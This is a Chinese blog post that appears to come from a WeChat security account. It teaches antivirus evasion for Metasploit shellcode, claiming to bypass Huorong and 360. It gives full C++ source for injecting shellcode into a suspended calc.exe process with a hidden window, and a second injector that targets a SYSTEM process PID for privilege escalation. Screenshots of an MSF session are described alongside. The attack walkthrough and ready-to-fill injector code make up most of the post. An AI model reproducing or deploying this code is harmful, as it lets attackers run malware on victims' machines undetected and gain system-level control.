<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/EfRG5ZQfe0qUt48qE2YiQw)

**shellcode 免杀（2）—C++ 二次内入免杀火绒 360 并提权（小苏免杀）**

![](https://mmbiz.qpic.cn/mmbiz_gif/Jvbbfg0s6ADMuIGia6aNL8HV7O7ctvE2sUOjLL0C6Z5X0Hrc0yy5CvMWAbvKyOot3DEjC5T32HKjCoS9ge4OZcA/640?wx_fmt=gif)

**_**1**_**

**简介  
**

小苏的文章  

[零基础学习渗透过程](http://mp.weixin.qq.com/s?__biz=MzAwMjc0NTEzMw==&mid=2653573708&idx=1&sn=c21e9f1072e3690381c65bab82e2a6f0&chksm=811b440eb66ccd189e7269fc2823492d346b907392ccf0a336d0f9b5721cee9612037d83775c&scene=21#wechat_redirect)  

[完整渗透流程原理讲解与 MSF 免杀 360](http://mp.weixin.qq.com/s?__biz=MzAwMjc0NTEzMw==&mid=2653573734&idx=1&sn=59fb846c2c03665e6d724fe0d8b103cf&chksm=811b4424b66ccd3287ee77335822535ff3ba0db903385ba7fffbc241df8fa5028ee060aebc10&scene=21#wechat_redirect)  

[shellcode 免杀（1）C 语言三条指令免杀 360](http://mp.weixin.qq.com/s?__biz=MzAwMjc0NTEzMw==&mid=2653574629&idx=1&sn=b6008765e5b81cd4f7318b6d87580f87&chksm=811b43a7b66ccab1ca738705753c618beccc2583c2c53a1ecdbfff2f13096a5f7a721d742cfc&scene=21#wechat_redirect)  

上篇 C 语言过 360 很多人可能会想这到底咋过的，其实就像我们经常喝水找杯子倒水一样的性质，杀软会考虑误报选择不杀，但是火绒就是六亲不认了**。**  

**_**2**_**

**免杀正题**

进入正题，这次直接先看 C++ 免杀效果

先准备好 msf 监听

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADMuIGia6aNL8HV7O7ctvE2s7Dlw1RSGsDMJW832rQcFY44q2AUyfYPDVsXiampvia7fFuEEHQa2Kl7A/640?wx_fmt=png)

生成免杀

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADMuIGia6aNL8HV7O7ctvE2sUpoz1hALcnK9oQaBx8ibejj7nq0SUYTnibKXEkp9o4Xf1tG2rF3vNKFg/640?wx_fmt=png)

进行火绒，360 检测双过关

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADMuIGia6aNL8HV7O7ctvE2sZ66lhJHl4u98tA6WlSkRcU9gibpFvDlRtSqACNkIEViapRviafIgzSyLQ/640?wx_fmt=png)

加载 msf 上线

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADMuIGia6aNL8HV7O7ctvE2s2IWUXAicy30bbfgnVatUNcC2TEIvDEtFysnibWj6TdjK5sKCZGRic1jicw/640?wx_fmt=png)

CS 的 code 很遗憾没过，可以用加密混淆进行 cs 免杀但是这里我就不去搞了，源码会放到最后，我们主要看思路，一般我们会从这三个方向下手。

1. 特征码，CS 算是被记烂了，想要从特征码过关那只有给他变个模样，也就是加密混淆。（有兴趣的可以百度特征码）；

2. 行为检测，字面意思看你做了什么，例如收集信息查看版本什么的，很多人也都会去做，所以就作为正常行为，但是你要用 office 进程去执行下载执行的命令，可能不会杀，但是告警就弹出来了，之后就是被做掉了。

3. 内存指令，其实就是特征码行为方面，就像女人化了妆看起来很漂亮，隆胸垫鼻梁，改造外观，但是再怎么改造内心思想还是原来的（比喻，并非歧视女性），目前看的话火绒对 cs 的内存指令应该还是有些保护不周。

进入正题分析

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADMuIGia6aNL8HV7O7ctvE2sZvMyUNgseR3ZBS7Jzt4QiayxuPLiaHVwFsicjVglia8UnpYaaMybscria7g/640?wx_fmt=png)

这里注意 define 抛错直接复制就好

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADMuIGia6aNL8HV7O7ctvE2sTZvAF6WtdQJYQ6rDcEs9yv80OyfCpatf1tENGztBVujPc97GVGJt5w/640?wx_fmt=png)

创建变量：

BOOL injection（），创建 shellcode 注射；

先看 TCHAR 这个作用就是区分常规的 ANSI 编码（使用 "" 包裹）和 Unicode 编码（使用 L"" 包裹）；

STARTUPINFO si ; 窗口特性创建

PROCESS_INFORMATION：创建新进程句柄

LPVOID 无类型的指针，创建两个变量；

HANDLE：窗口句柄，简单点理解就是创建的程序是窗口程序

DWORD 四字节变量，也就是这个 dwExitCode 不管怎么样就是一个四字节变量；

BOOL 初始化变量为 FALSE 实际表示的是 0；

运行过程：

给 lpMalwareBaseAddr 赋值为 shellcode；

```
GetSystemDirectory(Cappname,MAX_PATH);
_tcscat(Cappname,L"\\calc.exe");
printf("Injectionprogram Name:%S\r\n",Cappname);
```

获取计算器地址为了启动它；

ZeroMemory 清零数据；

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADMuIGia6aNL8HV7O7ctvE2sOnSybookD4ibKkqHKwSPgCZ54x99AnbMJokibYFUAyuvW608zzmnwyLQ/640?wx_fmt=png)

创建计算器，CreateProcess 创建新进程，调用已经获取的计算器目录地址，最后的参数为停止暂停，引用 si 和 pi 也就是窗口。最后的 return 就是如果失败就返回 0 结束；

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADMuIGia6aNL8HV7O7ctvE2sPbovUU6wicq559Tc704U0GoTZ9sdQ1iajWnu0qF6ULNmHmRN52uZSh9A/640?wx_fmt=png)

```
lpnewVictimBaseAddr= VirtualAllocEx(pi.hProcess
,NULL, sizeof(shellcode) + 1, MEM_COMMIT |MEM_RESERVE,
PAGE_EXECUTE_READWRITE);
```

开辟空间，获得进程句柄地址，null 表示自动分配内存地址，分配大小为 hellcode，后边为申请权限可读可运行。

```
WriteProcessMemory(pi.hProcess,lpnewVictimBaseAddr,
(LPVOID)lpMalwareBaseAddr,sizeof(shellcode)+1,NULL);
```

将 shellcode 写入进程，返回的句柄（句柄可以理解为是一种指向指针的指针，也就是存指针的指针），再就是要写的内存首地址，也就是进程内存空间，之后将我们赋值的指针数据写入，也就是 shellcode。

```
hThread=CreateRemoteThread(pi.hProcess,0,0,
(LPTHREAD_START_ROUTINE)lpnewVictimBaseAddr,NULL,0,NULL);
```

创建线程，线程所属的进程句柄也就是我们运行的程序，0 的意思为立即执行，起始地址为 addr

```
WaitForSingleObject(pi.hThread,INFINITE);
  GetExitCodeProcess(pi.hProcess,&dwExitCode);
  TerminateProcess(pi.hProcess,0);
return bR
```

et;  

等待进程结束

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADMuIGia6aNL8HV7O7ctvE2sWDWeFpSF90x286KC1RoVKp58icbMsibzurZA6rPMGDOXJ1k2ot91FqwQ/640?wx_fmt=png)

启动进程注入将代码注入进计算机进程里。

**_**3**_**

**总结：**

首先创建窗口，设置窗口特性，赋值 shellcode 给第一个指针，利用正常的启动计算器行为打掩护，并将句柄里的数据清空，开辟内存进程空间留出 shellcode 大小的进程空间，将第一个写入 shellcode 的指针写入第二个开辟的进程空间，（**重点：我们将** **shellcode** **现存如第一个指针但是不用那么就不会杀，之后我们做的行为都是正常行为进行混淆，接着进行空间开辟并保护起来**），之后就是将 shellcode 注入进这个计算机进程里。

到这里算是完成 shellcode 注入了，怎么说呢，这是九年前的思路，只是用了现在更替换代的代码形式表达出来，CS 确实强大所以主流杀软基本都把它记烂了，我也在努力自己写自己的专属马。

**_**4**_**

**注入提权**

可以配合注入进行提权操作如下

我们先利用开始的免杀进行注入获取 shell，之后在上传一个指定注入 pid 的免杀注入

开始我们是管理员权限，之后我们利用 pid 加这个进程的权限进行注入提权

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADMuIGia6aNL8HV7O7ctvE2sOOicI0fhk61y1Z9A9eQYbOTPWJ4LO58iapGVyaVt2rBfDkTX1Emicblow/640?wx_fmt=png)

我用了 msf 的提权会弹告警

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADMuIGia6aNL8HV7O7ctvE2sV2sNTqmogkQuAhoPaHNOgZ1cH7TagVCztVFDuG490fP7UmHicrVUtaA/640?wx_fmt=png)

阻止后就变成了

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADMuIGia6aNL8HV7O7ctvE2sFuLxQHChKH5dpUXibam5anxy8RJOs4BDsXtAUXOSjccjfKOJsKSEd7w/640?wx_fmt=png)

这里我们就查看系统运行的进程 pid 加上此进程权限进行注入提权，先看源码，我们直接在 pid 这里输入带有系统权限的 pid 进行生成

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADMuIGia6aNL8HV7O7ctvE2sY8UwZof9OeHuyoPQDhaWy0H87PyWBCmxufhLd7WItCSNVS6Fl5AIgA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADMuIGia6aNL8HV7O7ctvE2sY8UwZof9OeHuyoPQDhaWy0H87PyWBCmxufhLd7WItCSNVS6Fl5AIgA/640?wx_fmt=png)

生成后查杀也是全过

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADMuIGia6aNL8HV7O7ctvE2sibWZV7HkQ4jgziaT46EsqYJO4xj2iblelhqH3W3WEqCYYgNx0lg58xbcQ/640?wx_fmt=png)

之后在开启一个 msf 监听利用上一个免杀的 msf 进行运行查看权限, 得到系统权限，**友情提示，有些系统进程是无效的，看准了再射**

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADMuIGia6aNL8HV7O7ctvE2sb9L9Vjhs185tzUQt4O1m6JF7uxGEvn1CNiaqUZibtDt8lzuqBjFASmnw/640?wx_fmt=png)

免杀姿势还是蛮多的，但是像 CSshellcode 这样被记烂了就有点烦了。最后把源码给各位，工具找月师傅获取。

```
#define  _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include<stdio.h>
#include <tchar.h>
#include "iostream"
using namespace std;
unsigned char shellcode[] = "";//输入你可爱的MSFshellcode



BOOL injection()
{
    TCHAR Cappname[MAX_PATH] = { 0 };
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    LPVOID lpMalwareBaseAddr;
    LPVOID lpnewVictimBaseAddr;
    HANDLE hThread;
    DWORD dwExitCode;
    BOOL bRet = FALSE;

    lpMalwareBaseAddr = shellcode;

    GetSystemDirectory(Cappname, MAX_PATH);
    _tcscat(Cappname, L"\\calc.exe");
    printf("Injection program Name:%S\r\n", Cappname);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (CreateProcess(Cappname, NULL, NULL, NULL,
        FALSE, CREATE_SUSPENDED
        , NULL, NULL, &si, &pi) == 0)
    {
        return bRet;
    }

    lpnewVictimBaseAddr = VirtualAllocEx(pi.hProcess
        , NULL, sizeof(shellcode) + 1, MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (lpnewVictimBaseAddr == NULL)
    {
        return bRet;
    }

    WriteProcessMemory(pi.hProcess, lpnewVictimBaseAddr,
        (LPVOID)lpMalwareBaseAddr, sizeof(shellcode) + 1, NULL);

    hThread = CreateRemoteThread(pi.hProcess, 0, 0,
        (LPTHREAD_START_ROUTINE)lpnewVictimBaseAddr, NULL, 0, NULL);

    WaitForSingleObject(pi.hThread, INFINITE);
    GetExitCodeProcess(pi.hProcess, &dwExitCode);
    TerminateProcess(pi.hProcess, 0);
    return bRet;
}

void help(char* proc)
{
    printf("%s:[-] \nstart a process and injection shellcode to memory\r\n", proc);
}

int main(int argc, char* argv[])
{
    HWND hwndDOS = GetForegroundWindow(); //得到前台窗口的句柄
    ShowWindow(hwndDOS, SW_HIDE); //隐藏窗口
    help(argv[0]);
    injection();
    return 0;
}
```

第二个线程注入

```
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include<stdio.h>

unsigned char  ShellCode[] = "";

int main()
{
  HANDLE Handle;
  HANDLE remoteThread;
  PVOID remoteBuffer;
  DWORD Pid;
  Pid = ;
  
  
  Handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
  remoteBuffer = VirtualAllocEx(Handle, NULL, sizeof(ShellCode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(Handle, remoteBuffer, ShellCode, sizeof(ShellCode), NULL);
  remoteThread = CreateRemoteThread(Handle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
  CloseHandle(Handle);
  return 0;
}
```

**_**5**_**

**关注  
**

**关注本公众号 不定期更新文章和视频**

**欢迎前来关注**  

公众号

暗月的个人微信

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADMuIGia6aNL8HV7O7ctvE2sibFITfQU5mcIOldF3kXPbGZCkJKaO3Sky6pEqc3IuT28WQvxu1YGkpA/640?wx_fmt=png)